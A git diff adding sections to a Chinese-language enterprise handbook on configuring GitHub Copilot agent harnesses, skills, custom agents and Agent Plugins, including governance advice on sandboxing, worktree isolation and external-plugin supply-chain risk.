+> ⚠️ **本節是第三版新增的重要術語釐清。** 上一版手冊第 6.6 節把「harness」當成「VS Code／CLI／cloud agent／app 四種使用介面」。但 VS Code 官方文件（2026-08-28 複查）將 **agent harness** 定義為「產業界用來稱呼『統籌 Agent 的軟體』的術語」，並列出四種**執行時**：Local／Copilot／Claude／Codex。這是兩個完全不同的軸線，企業文件必須分開描述，否則會出現「我們只支援 VS Code harness」這種語意不明的規定。
+
+#### 兩個軸線的對照
+
+| 軸線 | 選項 | 回答的問題 |
+|---|---|---|
+| **使用介面**（本手冊 6.5／6.6 節） | VS Code、Copilot CLI、Copilot app、cloud agent、GitHub.com Code Review | 「使用者從哪裡下指令、設定檔放哪裡」 |
+| **Agent Harness**（VS Code 官方定義） | Local、Copilot、Claude、Codex | 「是誰在跑 Agent 迴圈、用哪套 SDK」 |
+
+#### 四種 Agent Harness（官方已實作）
+
+| Harness | 執行方式 | 可用工具來源 | 企業治理重點 |
+|---|---|---|---|
+| **Local** | VS Code 內建，跑在 extension host 中 | VS Code 內建工具、其他擴充套件提供的工具、MCP Server、可選模型 | 工具面最廣，代表攻擊面也最廣，需搭配第 20.6 節 sandboxing |
+| **Copilot** | 使用 **Copilot SDK**，跑在 **Agent Host** 上 | Copilot SDK 提供的工具集＋ MCP | 使用者層客製化讀 `~/.copilot`，**不是** VS Code profile（見 6.3） |
+| **Claude** | 使用 Anthropic **Claude Agent SDK**，可本機執行，也有雲端版 | Claude Agent SDK 工具集 | 使用者層客製化讀 `~/.claude`；對應第 33 章跨工具標準 |
+| **Codex** | 本機執行 OpenAI Codex，也有雲端版 | Codex 工具集 | 第三方模型供應商，需納入企業資料外傳政策審查 |
+
+#### Session Target：一次工作階段的四個獨立選擇
+
+VS Code 將這四項選擇集中在 Chat 輸入框的 **Session Target** 控制項，四者**彼此獨立**：
+
+```text
+Session Target
+├── Agent harness        Local / Copilot / Claude / Codex
+├── Execution environment 本機 / 遠端機器 / 雲端
+├── Agent role           Agent / Plan / Ask / 自訂 Agent（.agent.md）
+└── Language model       依 harness 可用的模型清單
+```
+
+實務上最常被誤解的是「Agent role」與「Agent harness」的關係：你在第 9 章建立的 `.agent.md` 是 **role**，不是 harness；同一份 `.agent.md` 可能在不同 harness 下可用工具不同，這正是第 6.5 節支援矩陣存在的原因。
+
+#### Code Isolation：Folder 與 Worktree
+
+| 模式 | 行為 | 適用情境 | 限制 |
+|---|---|---|---|
+| **Folder isolation** | 直接在當前工作區作業，看得到尚未 commit 的變更 | 一次只跑一個任務、需要延續手邊未完成的工作 | 多 Agent 並行時會互相覆寫 |
+| **Worktree isolation** | 從 base branch 的**已 commit 狀態**另開一個 Git worktree | 多任務平行（對應第 10 章 Agent Team） | **需要至少有一筆 commit 的 Repository**；看不到未 commit 的變更 |
+
+> ⚠️ **安全釐清（官方文件明文）**：「worktree 是 Git 的**程式碼隔離邊界**，**不是安全邊界**。」它防的是「兩個 Agent 改到同一個檔案」，不是「Agent 執行惡意指令」。後者需要的是第 20.6 節的 **Agent Sandboxing**。不少企業把「我們都用 worktree」寫進安全政策，這是錯誤的安全假設。
+
+#### Agent Host 與 Session Handoff
+
+**Agent Host** 是一個專用程序，與「顯示該 session 的視窗」解耦執行，因此支援：
+
+- **背景延續**：關掉視窗或切換專案，Agent 仍繼續工作。
+- **跨視窗同步**：同一 session 可在不同視窗查看。
+- **遠端執行**：搭配 Execution environment 選項，把實際執行搬到遠端機器或雲端。
+- **Session handoff**：同一個工作階段可在不同 harness／執行環境之間交接（例如本機起手、交給雲端跑完）。
+
+> ⚠️ **治理含意（建議架構）**：「背景延續」代表 Agent 可能在**沒有人盯著螢幕**的情況下持續修改程式碼。企業導入自主程度較高的模式（如 Autopilot）時，必須同時完成三件事：（1）開啟第 20.6 節 sandboxing；（2）使用 worktree isolation；（3）依第 31 章建立合併前的 Quality Gate。三者缺一不可。
 
 ### Scenario
 
@@ -646,7 +1047,11 @@ project/
 
 - [ ] 已依 6.1 建立企業 Repository 的客製化目錄骨架
 - [ ] 已用 6.2 分清楚「哪些是 Copilot 客製化、哪些是一般 GitHub Actions」
+- [ ] Monorepo 專案已評估是否開啟 `chat.useCustomizationsInParentRepositories`（6.4）
 - [ ] 已用 6.5 支援矩陣確認團隊實際使用的 Client 是否支援目標機制
+- [ ] 已依 6.6 明列企業支援的 harness 範圍，並確認 Copilot app 也在治理範圍
+- [ ] 已依 6.7 區分「使用介面」與「Agent Harness（Local／Copilot／Claude／Codex）」兩個軸線，且企業文件用詞一致
+- [ ] 已向團隊宣導「worktree 不是安全邊界」，避免錯誤的安全假設（6.7）內
 
 ---
 
@@ -820,7 +1225,20 @@ Agent Skills 是 GitHub Copilot **官方已實作**的功能（2025-12-18 GA）�
 | `license` | 否 | 授權條款 |
 | `allowed-tools` | 否 | 限制此 Skill 可使用的工具範圍 |
 
-**VS Code 版本額外欄位**：`argument-hint`、`user-invocable`、`disable-model-invocation`、`context`（`context: fork` 為**實驗性**，需開啟 `github.copilot.chat.skillTool.enabled`）。
+**VS Code 官方版本的完整規格（2026-08-28 複查，官方已實作）**——這一版把長度上限與命名限制寫得最清楚，也是實務上最常踩坑的地方：
+
+| 欄位 | 必要 | 規格與限制 |
+|---|---|---|
+| `name` | 是 | 只允許**小寫字母、數字、連字號**；**不可**含斜線、冒號、點號或 namespace 前綴；**必須與上層資料夾同名**；**最多 64 字元**。含非法字元時會**静默失敗**（不會報錯，只是載不到） |
+| `description` | 是 | 需同時說明「能做什麼」與「什麼時候用」；**最多 1024 字元**（awesome-copilot 貢獻規範另要求至少 10 字元且以單引號包住） |
+| `argument-hint` | 否 | 以 slash command 呼叫時顯示於輸入框的提示文字（如 `[test file] [options]`） |
+| `user-invocable` | 否 | 預設 `true`；設為 `false` 可從 `/` 選單隱藏，但模型仍可自動載入 |
+| `disable-model-invocation` | 否 | 預設 `false`；設為 `true` 則**只能**手動以 slash command 呼叫 |
+| `context` | 否 | **實驗性**。預設 `inline`（載入父 Agent context）；設為 `fork` 則在專用 subagent 中執行、只回傳最終結果。需開啟 `github.copilot.chat.skillTool.enabled` |
+
+> ⚠️ **實務上最常見的三個「Skill 沒載入」原因**（1）`name` 與資料夾名不一致；（2）`name` 自作主張加了 `myorg/skillname` 或 `myorg:skillname` 前綴；（3）`description` 寫得太抽象。**前兩項都是静默失敗**，不會有任何錯誤訊息，這也是企業必須在 CI 加上 `npm run skill:validate` 同等驗證的原因（見第 2.8 節）。
+>
+> ⚠️ **Skill 被打包進 Plugin 時**，Plugin 名稱會被**自動**當成命令前綴（例如 `/my-plugin:test-runner`），因此更不可手動在 `name` 裡加前綴。
 
 官方範例（逐字取自文件）：
 
@@ -873,8 +1291,19 @@ graph LR
 ### 8.5 觸發方式
 
 - **自動觸發**：Copilot 依任務內容與 Skill 的 `description` 相關性自動判斷載入（多數 Client）。
-- **明確呼叫**：VS Code 端若 `user-invocable` 未設為 `false`，可透過 Skill 名稱明確呼叫。
-- **停用模型自主調用**：`disable-model-invocation: true` 可讓 Skill 只能被明確呼叫，不會被 AI 自動判斷載入——適合「敏感／破壞性」的 Skill。
+- **Slash Command 明確呼叫**：在 VS Code Chat 輸入 `/` 即可看到可用的 Skill 與 Prompt files，並可在命令後附加語絡（例如 `/webapp-testing for the login page`）。
+- **兩個開關的四種組合**（官方已實作）：
+
+| `user-invocable` × `disable-model-invocation` | 出現在 `/` 選單 | 模型可自動載入 | 適用情境 |
+|---|---|---|---|
+| 兩者皆略（預設） | 是 | 是 | 一般用途的 Skill |
+| `user-invocable: false` | 否 | 是 | 背景知識型 Skill，不需要使用者記得它存在 |
+| `disable-model-invocation: true` | 是 | 否 | **敏感／破壞性操作**，必須人工明確呼叫 |
+| 兩者都設 | 否 | 否 | 等同於停用（可當成測試時的快速關閉手段） |
+
+> ⚠️ **企業治理建議**：凡是會修改程式碼、執行部署或對外連線的 Skill，一律設 `disable-model-invocation: true`，強制變成「人類只能主動呼叫」，這是成本最低、效果最直接的一道防線（對應第 21.2 節 Risk Level 的 HIGH／CRITICAL 層級）。
+
+- **建立方式（官方已實作，2026-08-28 新增查證）**：除了手寫，可在 VS Code Chat 輸入 `/create-skill` 讓 AI 依描述產生 `SKILL.md` 鷹架；也可在一段多輪對話結束後要求「把剛剛除錯的流程寫成 Skill」，把實際經驗沉漱成可重複使用的資產；或在 Agent Customizations 編輯器選 **Generate Skill**。輸入 `/skills` 可快速開啟 Configure Skills 選單。
 
 ### 8.6 Skill Lifecycle、Versioning、Testing、Security
 
@@ -1079,6 +1508,42 @@ allowed-tools: read, search
 本 Skill 僅提出審查意見，**不可自行修改程式碼**，修復須由開發者確認後另行提交。
 ```
 
+### 8.11 Skill 與客製化檔案的品質評測：Chat Customizations Evaluations 與 Waza
+
+企業導入 Skill 一段時間後，最大的隱形成本不是「寫不出來」，而是**「寫出來的規則彼此矛盾、語意模糊、認知負荷過重，但沒有人發現」**。2026-08-28 複查 VS Code 官方文件發現，官方已針對這個問題推出專用工具（Preview）。
+
+#### Chat Customizations Evaluations 擴充套件（Preview）
+
+| 項目 | 內容 |
+|---|---|
+| 識別碼 | `ms-vscode.vscode-chat-customizations-evaluations`（**獨立發布，需另行安裝**） |
+| 支援檔案 | `SKILL.md`、`*.agent.md`、`*.instructions.md`、`*.prompt.md` |
+| 呈現方式 | 診斷結果出現在 **Problems 面板**；可用 **Implement Suggestions** 一鍵套用修正；亦可用 `/analyze-prompt` slash command 在 Chat 中取得摘要 |
+
+官方列出的偵測面向（可直接抄成企業的客製化資源 Code Review 檢查表）：
+
+| 偵測面向 | 說明 | 企業常見案例 |
+|---|---|---|
+| 邏輯／行為／格式矛盾 | 同一份檔案內前後規則互相牴觸 | 前段寫「一律使用 Constructor Injection」，後段範例卻用 `@Autowired` 欄位注入 |
+| 語意模糊 | 指示不夠明確，並提供改寫建議 | 「請寫出高品質的測試」→ 未定義涵蓋率門檻與斷言風格 |
+| 人格特質衝突與語氣漂移 | Agent persona 前後不一致 | 前段要求「簡潔、只給結論」，後段又要求「逐步解釋推理過程」 |
+| 認知負荷過重 | 條件式巢狀過深 | 五層 if/else 的判斷規則，模型實務上難以穩定遵循 |
+| 意圖涵蓋缺口與缺少錯誤路徑 | 只寫了 happy path | 只定義「測試通過怎麼做」，沒定義「測試失敗怎麼做」 |
+| 與被連結檔案衝突 | 檔案間引用彼此矛盾 | `.agent.md` 引用的 Skill 規則與 `copilot-instructions.md` 相反 |
+
+#### Waza 評測框架
+
+針對 Skill，該擴充套件另整合了微軟開源的評測框架 **Waza**（`github.com/microsoft/waza`），提供以下命令：
+
+| 命令 | 用途 |
+|---|---|
+| `Download Waza Binary` | 下載評測執行檔 |
+| `Create Waza Eval Scaffold` | 為 Skill 建立評測鷹架 |
+| `Run Waza Evaluation` | 實際執行評測 |
+| `Open Analysis and Fix User Guide` | 開啟分析與修正指南 |
+
+> ⚠️ **企業實務建議（建議架構）**：把「Skill／Agent 檔案必須通過 Chat Customizations Evaluations 零診斷」列為第 31 章 Quality Gate 的一道關卡，並在 CI 上以第 2.8 節提到的 schema 驗證作為第二道防線。兩者分工是：schema 驗證管**格式正確性**，Evaluations 管**語意品質**，缺一不可。需注意此擴充套件目前為 Preview，企業標準文件應註明版本與可能變動。
+
 ### Scenario
 
 某團隊把 Reverse Engineering Skill 的 `description` 寫得太模糊（例如只寫「分析程式碼」），結果 Copilot 在許多不相關的任務中都誤判為相關而載入此 Skill，浪費 context 且干擾正常開發建議。**修正**：把 `description` 寫得更精確、包含「Use this when...」的明確觸發情境描述（如 8.8 範例），大幅降低誤觸發率。
@@ -1103,6 +1568,7 @@ allowed-tools frontmatter），產出：
 - [ ] 已理解 Agent Skills 是官方 GA 功能，且與 Claude Code `.claude/skills` 互通
 - [ ] 每個 Skill 的 `description` 都寫明確的觸發情境，避免誤觸發
 - [ ] 敏感／破壞性 Skill 已考慮設定 `disable-model-invocation: true`
+- [ ] 已評估導入 Chat Customizations Evaluations（Preview）作為 Skill 語意品質檢查（8.11）
 - [ ] 已建立至少一個企業版 Skill 並在沙盒環境驗證載入行為
 
 ---
@@ -1123,28 +1589,48 @@ VS Code 官方原文明確說明這是「更名」而非「新功能」：
 
 ### 9.2 `.agent.md` 完整 Frontmatter 欄位
 
-| 欄位 | 說明 |
-|---|---|
-| `description` | Agent 的簡短描述 |
-| `name` | Agent 名稱 |
-| `argument-hint` | 輸入框提示文字 |
-| `tools` | 此 Agent 可使用的工具集 |
-| `agents` | 可交辦的子 Agent（`*` = 全部、`[]` = 無） |
-| `model` | 指定模型，可為字串或優先序陣列 |
-| `user-invocable` | 是否可被使用者手動呼叫（預設 `true`） |
-| `disable-model-invocation` | 是否停用 AI 自動調用（預設 `false`） |
-| `target` | 執行環境，`vscode` 或 `github-copilot` |
-| `mcp-servers` | 此 Agent 綁定的 MCP Server 設定 |
-| `handoffs` | 可交接的目標 Agent 清單 |
-| `hooks` | Agent 層級的生命週期 Hook（**Preview**） |
+| 欄位 | 必要 | 說明 |
+|---|---|---|
+| `description` | **是** | Agent 的簡短描述；awesome-copilot 貢獻規範要求**以單引號包住** |
+| `name` | 否（建議） | 顯示名稱；若省略則以檔名為準。**awesome-copilot 要求必須是人類可讀的名稱**（如 `Address Comments`），而非檔名式的 `address-comments` |
+| `argument-hint` | 否 | 輸入框提示文字 |
+| `tools` | 否（建議） | 此 Agent 可使用的工具集；**Prompt file 的 `tools` 優先於 Custom Agent 的 `tools`** |
+| `agents` | 否 | 可交辦的子 Agent（`*` = 全部、`[]` = 無） |
+| `model` | 否（強烈建議） | 指定模型，可為字串或優先序陣列；awesome-copilot 強烈建議填寫以確保行為一致 |
+| `user-invocable` | 否 | 是否可被使用者手動呼叫（預設 `true`） |
+| `disable-model-invocation` | 否 | 是否停用 AI 自動調用（預設 `false`） |
+| `infer` | 否 | **已廊棄（Deprecated）**，功能已被 `user-invocable` 與 `disable-model-invocation` 取代；新專案不要再使用 |
+| `target` | 否 | 執行環境，`vscode` 或 `github-copilot` |
+| `mcp-servers` | 否 | 此 Agent 綁定的 MCP Server 設定；**僅在 `target: github-copilot` 時生效**，在 `target: vscode` 下會被忽略 |
+| `handoffs` | 否 | 可交接的目標 Agent 清單，每項可含 `label`（按鈕文字）、`agent`（目標 Agent）、`prompt`（交接時帶入的提示）、`send`（是否自動送出）、`model`（交接後使用的模型） |
+| `hooks` | 否 | Agent 層級的生命週期 Hook（**Preview**，需開啟 `chat.useCustomAgentHooks`） |
 
-### 9.3 存放位置
+**本文（body）的寫法態別**：在 Agent 本文中可用 `#tool:<tool-name>` 直接引用工具（例如 `#tool:web/fetch`），也可用 Markdown 連結引用專案內的規範檔，讓 Agent 在需要時才去讀取——這是控制 Agent 本文長度、避免 context 爆量的標準做法。
 
-| 範圍 | 路徑 |
+### 9.3 存放位置與組織層共享
+
+| 範圍 | 路徑或設定 |
 |---|---|
 | 專案（GitHub 官方） | `.github/agents/` |
-| 專案（Claude 格式相容） | `.claude/agents/` |
+| 專案（Claude 格式相容） | `.claude/agents/`（純 `.md`，frontmatter 為 `name`／`description`／`tools`（**逗號分隔字串**）／`disallowedTools`；VS Code 會自動將 Claude 工具名稱映射到對應的 VS Code 工具） |
 | 個人 | `~/.copilot/agents/` |
+| 自訂位置 | VS Code `chat.agentFilesLocations` 設定 |
+| 組織層 | `github.copilot.chat.organizationCustomAgents.enabled`（開啟後可從組織發現共用 Custom Agents） |
+
+> ⚠️ **Agent Host 的例外（極容易踩坑）**：Agent Host 情境下的個人層 Agent 是從 `~/.copilot/agents` 讀取，**不是** VS Code 自己的 profile 資料夾。若發現「VS Code 設定里看得到、但 Agent Host 跑起來沒有這個 Agent」，八成是這個原因。
+>
+> 工具：在 VS Code Chat 面板上**按右鍵 → Diagnostics**，可一次列出目前實際載入的所有 Agents、Prompts、Instructions、Skills 及其錯誤，是排查「為什麼沒生效」最快的手段（規則層除錯見第 27 章）。
+
+### 9.3.1 Agent 的建立與管理入口（官方已實作）
+
+| 入口 | 說明 |
+|---|---|
+| `/create-agent` | 在 Chat 中用自然語描述需求，由 AI 產生 `.agent.md` 鷹架 |
+| `/agents` | 快速開啟 Agent 設定選單 |
+| `Chat: New Custom Agent` | 命令面板建立新 Agent 檔 |
+| Agent Customizations 編輯器 | 執行 `Chat: Open Customizations`（**Preview**），以表單式介面管理所有客製化資源，並可點 **Generate Agent**／**Generate Skill** |
+| 從對話萊取 | 一段對話結束後要求 Copilot 「把這段流程寫成 Custom Agent」，把一次性經驗轉成可重複使用的資產 |
+| `chat.subagents.allowInvocationsFromSubagents` | 控制 subagent 是否可再呼叫其他 subagent；企業建議明確設定，避免難以追蹤的多層交辦 |
 
 ### 9.4 企業 Agent Team Catalog（12 個 Agent）
 
@@ -1255,6 +1741,53 @@ target: github-copilot
 - 任何跨 Agent 交接前，必須確認上一階段的產出已符合驗收標準
 ```
 
+### 9.6 Agent Customizations 編輯器與使用者客製化遷移
+
+2026-08-28 複查 VS Code 官方文件時，發現官方已提供一個集中管理所有客製化資源的入口，這對企業推廣「人人都會寫 Agent」大幅降低門檻。
+
+#### Agent Customizations 編輯器（Preview）
+
+| 特性 | 說明 |
+|---|---|
+| 定位 | 探索、建立、管理所有客製化資源（Instructions／Skills／Agents／Prompt files／MCP／Plugins）的單一入口，具語法標示與驗證 |
+| **與 harness 綁定** | 編輯器內容**依當前選定的 agent harness 而定**；開啟前必須先在 Chat 輸入框選好 harness（見第 6.7 節），否則會看到不完整的清單 |
+| 建立方式 | 可在 Overview 分頁「用 AI 產生」；或由 Command Palette 執行 `Chat: New <customization-type>` 手動建立 |
+| Marketplace | MCP Server 與 Agent Plugin 可直接從編輯器內瀏覽 Marketplace 安裝 |
+| Scope | **User**（跨工作區、不進版控）／**Workspace**（透過版控分享）／部分類型另支援 **Organization** |
+
+> ⚠️ **企業導入注意（建議架構）**：「用 AI 產生客製化資源」對推廣很有幫助，但也代表**未經審查的資源會大量出現在個人 User scope**。企業標準應明訂：User scope 僅供個人實驗，任何要影響他人的資源一律必須進入 Workspace scope 並走 CODEOWNERS 審查（第 20.3 節），這條界線必須寫死。
+
+#### 使用者層客製化的實際存放位置
+
+這是第 6.3 節「Agent Host 例外」的完整版本，也是企業最容易踩到的一個坑：
+
+| Harness | 使用者層客製化讀取位置 |
+|---|---|
+| Copilot | `~/.copilot` |
+| Claude | `~/.claude` |
+
+VS Code 官方明載，Agent Host 從**與 harness 無關的資料夾**讀取使用者層客製化，**而不是 VS Code profile 的 user data**。因此「我在 VS Code 設定裡建了個人 Agent，為什麼 Copilot harness 讀不到？」是預期行為，不是 Bug。
+
+#### 使用者客製化遷移（Experimental）
+
+| 項目 | 內容 |
+|---|---|
+| 設定 | `chat.customizations.userDataMigration.enabled` |
+| 入口 | 開啟後，Agent Customizations 編輯器的 Overview 分頁會出現 **Migrate User Data Customizations** 卡片 |
+| 用途 | 把既有存放在 VS Code profile 內的個人客製化，搬到 `~/.copilot`／`~/.claude` 等 harness 共用位置 |
+| **重要限制** | **遷移後的檔案不會透過 Settings Sync 漫遊**——換一台機器就沒有了 |
+
+> ⚠️ **企業實務結論（建議架構）**：由於遷移後不再隨 Settings Sync 漫遊，企業不應把重要的客製化資源留在使用者層。正確做法是**把所有具團隊價值的資源上推到 Repository 或 Plugin**（第 11-12 章），使用者層只保留個人習慣類的設定。這也順帶解決了「離職交接時個人 Agent 一起消失」的問題。
+
+#### 疑難排解入口
+
+當客製化資源沒有如預期生效時，官方提供的第一手診斷工具是：
+
+- Command Palette → `Developer: Open Agent Debug Panel`
+- 或 Chat 檢視右上「…」選單 → **Show Agent Debug Logs**
+
+詳細診斷流程見第 27.2 節。
+
 ### Scenario
 
 某團隊一開始讓 `security-agent` 的 `tools` 欄位誤設為 `read, edit, search, terminal`（沿用了其他 Agent 的設定範本），結果該 Agent 在某次審查中「順手」修改了程式碼，導致審查紀錄與實際變更混在一起，事後難以追溯是誰的決策。**教訓**：每個 Agent 的 `tools` 授權都必須依其職責量身設定，審查型 Agent 應嚴格限制為唯讀（`read, search`），不可圖方便沿用其他 Agent 的設定。
@@ -1280,6 +1813,8 @@ target: github-copilot
 - [ ] 每個企業 Agent 的 `tools` 欄位都依職責設定最小權限
 - [ ] 審查型 Agent（security/code-review）已確認為唯讀，不可修改程式碼
 - [ ] 已建立至少 3 個核心 Agent 並驗證 Handoff 機制運作正常
+- [ ] 已明訂「User scope 僅供個人實驗、影響他人者一律進 Workspace scope 並走審查」的界線（9.6）
+- [ ] 團隊已知悉使用者層客製化遷移後不隨 Settings Sync 漫遊，重要資源應上推至 Repository／Plugin（9.6）
 
 ---
 
@@ -1453,18 +1988,53 @@ GitHub Copilot Plugins 正式名稱為 **Agent Plugins 1.0**，於 2026-08-12 GA
 
 ### 11.3 `plugin.json` Schema 與目錄結構
 
+#### 目錄結構
+
 ```text
 enterprise-web-plugin/
 ├── plugin.json              # manifest，$schema 指向 Agent Plugins 1.0 schema（唯一必要檔案）
-├── agents/                  # Custom Agents（.agent.md），安裝後會出現在使用者的 Agent 選單
-├── skills/                  # Agent Skills（SKILL.md 資料夾），開放規範中的固定位置，與獨立發布的 Skill 結構完全相同
-├── hooks/                   # Hooks（*.json），安裝後併入該 Repository 的 Hook 生命週期事件
-├── mcp.json                 # MCP Server 設定，安裝後自動註冊給 Agent 使用，不需使用者另外手動設定
-├── com.github.copilot/      # Client 擴充目錄（開放規範稱為 client-namespace/），放 GitHub Copilot 專屬、其他 Client 不需要讀取的額外設定
+├── agents/                  # Custom Agents，安裝後會出現在使用者的 Agent 選單
+├── skills/                  # Agent Skills（每個 Skill 一個資料夾，內含 SKILL.md）
+├── hooks/                   # Hooks（*.json），安裝後併入 Agent 的生命週期事件
+├── mcp.json                 # MCP Server 設定，安裝後自動註冊給 Agent 使用
 └── README.md                # 說明文件，awesome-copilot 貢獻規範要求每個 Plugin 都要有
 ```
 
 依 Agent Plugins 1.0 開放規範（`agent-plugins.org`），所有檔案路徑須以 `./` 開頭且保持在 Plugin 根目錄內，不可引用外部路徑。
+
+#### 欄位分成兩區：頂層 metadata + `extensions` 內容組合
+
+**（2026-08-28 複查更新，Source-confirmed）** 這是本手冊初版最容易寫錯的一段。awesome-copilot 現行所有 Plugin 的 `plugin.json` **並非**在頂層直接寫 `agents`／`skills`／`hooks`，而是採**宣告式的 `extensions` 命名空間**——把「這個 Plugin 帶了哪些內容」放進 `extensions.com.github.awesome-copilot` 底下：
+
+| 區塊 | 欄位 | 說明 |
+|---|---|---|
+| **頂層 metadata** | `$schema` | 指向 `https://agent-plugins.org/schemas/1.0.0/plugin.schema.json` |
+| | `name` | Plugin 識別名，須與資料夾同名 |
+| | `description` | 用途描述 |
+| | `version` | 語意化版本 |
+| | `author` | **物件**（如 `{ "name": "..." }`），不是字串 |
+| | `repository`／`license`／`keywords` | 來源、授權、檢索關鍵字 |
+| **`extensions`** | `com.github.awesome-copilot.agents` | Agent 檔案路徑陣列（如 `"./agents/se-security-reviewer.md"`） |
+| | `com.github.awesome-copilot.skills` | Skill **資料夾**路徑陣列（如 `"./skills/java-junit/"`，注意結尾斜線） |
+| | `com.github.awesome-copilot.hooks` | Hook 設定檔路徑陣列 |
+| | `com.github.copilot.logo` | Canvas Extensions 專用，值必須正好是 `"assets/preview.png"` |
+
+> ⚠️ **三個實測得到、文件不易看出的細節**（2026-08-28 以 `plugins/java-development/plugin.json`、`plugins/software-engineering-team/plugin.json`、`plugins/devops-oncall/plugin.json` 三份真實檔案交叉核對）：
+>
+> 1. **Plugin 內的 Agent 檔名是 `*.md`，不是 `*.agent.md`**——因為路徑已明確寫在 `agents` 陣列中，不需靠副檔名被自動探索。獨立放在 `.github/agents/` 的 Agent 才需要 `.agent.md`。
+> 2. **Skill 路徑指向資料夾且以 `/` 結尾**，與 Agent 指向單一檔案不同。
+> 3. **`author` 是物件不是字串**，寫成 `"author": "Platform Team"` 會無法通過 `npm run plugin:validate`。
+
+> ⚠️ **為什麼要用 `extensions` 命名空間？** 因為 Agent Plugins 1.0 是**跨廠商開放標準**，同一份 Plugin 可能被不同 Client（GitHub Copilot、其他 Agent 平台）讀取。把各家專屬的內容組合放進以反向網域命名的 namespace（`com.github.awesome-copilot`）底下，其他 Client 遇到不認得的 namespace 可以直接忽略，不會解析失敗。這與 `AndroidManifest.xml`、`Info.plist` 的自訂欄位設計思維一致。
+
+#### MCP 設定檔名的官方不一致（企業必須知道）
+
+| 來源 | 檔名 |
+|---|---|
+| awesome-copilot 貢獻規範 | Plugin 根目錄的 `mcp.json`（**明文禁用** `.mcp.json`） |
+| `docs.github.com` 的 about-plugins 說明 | `.mcp.json`（另有 `lsp.json` 用於 Language Server） |
+
+> ⚠️ 這是**已查證確認存在的官方文件不一致**，並非本手冊誤植。企業自建 Plugin 時的建議：以**實際目標 Client 的實測結果**為準，先用一個最小 Plugin 驗證 MCP 是否真的被註冊成功（`copilot mcp list` 或 VS Code 的 MCP 面板），再據以決定檔名，不要只憑文件推論。
 
 ### 11.4 完整企業 Plugin 範例：Enterprise Web Development Plugin
 
@@ -1474,31 +2044,92 @@ enterprise-web-plugin/
 {
   "$schema": "https://agent-plugins.org/schemas/1.0.0/plugin.schema.json",
   "name": "enterprise-web-plugin",
-  "description": "Enterprise Web Application Development toolkit: agents, skills, hooks, and MCP configuration for Java 25 + Spring Boot 4.x + Vue 3 projects.",
+  "description": "Enterprise Web Application Development toolkit: agents, skills, and hooks for Java 25 + Spring Boot 4.x + Vue 3 projects.",
   "version": "1.0.0",
-  "author": "Platform Engineering Team",
+  "author": {
+    "name": "Platform Engineering Team"
+  },
+  "repository": "https://github.com/acme-corp/enterprise-plugins",
+  "license": "UNLICENSED",
   "keywords": ["java", "spring-boot", "vue", "enterprise", "web-development"],
-  "agents": [
-    "agents/system-architect.agent.md",
-    "agents/frontend-architect.agent.md",
-    "agents/backend-architect.agent.md",
-    "agents/security-agent.agent.md",
-    "agents/code-review-agent.agent.md"
-  ],
-  "skills": [
-    "skills/web-application-development",
-    "skills/security-review"
-  ],
-  "hooks": [
-    "hooks/pre-commit-quality-gate.json"
-  ],
-  "mcp": "mcp.json"
+  "extensions": {
+    "com.github.awesome-copilot": {
+      "agents": [
+        "./agents/system-architect.md",
+        "./agents/frontend-architect.md",
+        "./agents/backend-architect.md",
+        "./agents/security-agent.md",
+        "./agents/code-review-agent.md"
+      ],
+      "skills": [
+        "./skills/web-application-development/",
+        "./skills/security-review/"
+      ],
+      "hooks": [
+        "./hooks/pre-commit-quality-gate.json"
+      ]
+    }
+  }
 }
 ```
 
-> ⚠️ `$schema` 已改用 Agent Plugins 1.0 官方規範 repo（`agentplugins/agent-plugins-spec`）發布的正式 Schema URL（`https://agent-plugins.org/schemas/1.0.0/plugin.schema.json`，2026-08-27 查證）。`agents`／`skills`／`hooks`／`mcp` 等欄位鍵名依 GitHub 官方 `about-plugins` 文件與 awesome-copilot 實際 Plugin 範例整理，撰寫企業 Plugin 前仍建議重新核對當下最新版規範，因為開放規範可能隨版本演進而調整欄位。
+> ⚠️ 上述結構已對照 awesome-copilot 三份真實 `plugin.json` 逐欄核實（Source-confirmed，2026-08-28）。若企業自建 Plugin 供其他 Client 使用，`com.github.awesome-copilot` 這個 namespace 可能需替換為目標 Client 對應的命名空間；撰寫前務必重新核對當下最新版開放規範，因為規範仍在演進。
 
 **開放規範 vs awesome-copilot 貢獻規則的差異**（容易混淆處）：Agent Plugins 1.0 開放規範本身**只強制要求 `$schema` 與 `name` 兩個欄位**，`description`／`version`／`author` 等皆為選填；但 **awesome-copilot 自己的 `CONTRIBUTING.md` 額外要求貢獻者必填 `name`／`description`／`version`**。這代表「符合開放規範」與「符合 awesome-copilot 收錄門檻」是兩件不同的事——企業若只是要在內部環境打包 Plugin 自用，可以只填規範要求的最低欄位；但若要投稿回 awesome-copilot，則需依其 `CONTRIBUTING.md` 補齊額外必要欄位。
+
+### 11.5 External Plugins：`plugins/external.json` 與審查流程
+
+除了直接收錄在 `plugins/<name>/` 目錄內的「內建 Plugin」之外，awesome-copilot 另有一條**外部 Plugin（External Plugins）**路徑：Plugin 的原始碼留在貢獻者自己的公開 GitHub Repository，awesome-copilot 只在 `plugins/external.json` 中登錄一筆指標，讓它能被 Marketplace 檢索到（Source-confirmed，2026-08-28 依 `CONTRIBUTING.md` 與 `eng/external-plugin-validation.mjs` 查證）。
+
+#### 內建 Plugin 與 External Plugin 的差異
+
+| 面向 | 內建 Plugin（`plugins/<name>/`） | External Plugin（`plugins/external.json`） |
+|---|---|---|
+| 原始碼位置 | awesome-copilot Repository 內 | 貢獻者自己的公開 GitHub Repository |
+| 版本控制 | 隨 awesome-copilot 的 commit 一起版控 | 由指向的 ref／SHA 決定 |
+| 內容變更 | 必須經 awesome-copilot 的 PR review | **可由外部維護者自行變更**，awesome-copilot 不再逐次審查 |
+| 審查方式 | PR review + `npm run plugin:validate` | Issue 審查流程 + `eng/external-plugin-validation.mjs` + 每六個月自動 re-review |
+| 企業風險等級 | 中（等同一般社群資源） | **高**（供應鏈指向外部，內容可在核准後被改動） |
+
+> ⚠️ **這是企業最容易忽略的供應鏈破口**：External Plugin 一旦通過審查，其**內容仍由外部維護者掌控**。這代表「今天審查過的 Plugin」與「明天實際安裝到開發者機器上的 Plugin」不必然是同一份內容，風險模式與 npm 的 `latest` tag 完全相同。
+
+#### 登錄格式（示意）
+
+```json
+{
+  "plugins": [
+    {
+      "name": "example-external-plugin",
+      "description": "A community-maintained plugin hosted in its own repository.",
+      "source": {
+        "type": "github",
+        "repository": "owner/repo",
+        "ref": "v1.2.0"
+      }
+    }
+  ]
+}
+```
+
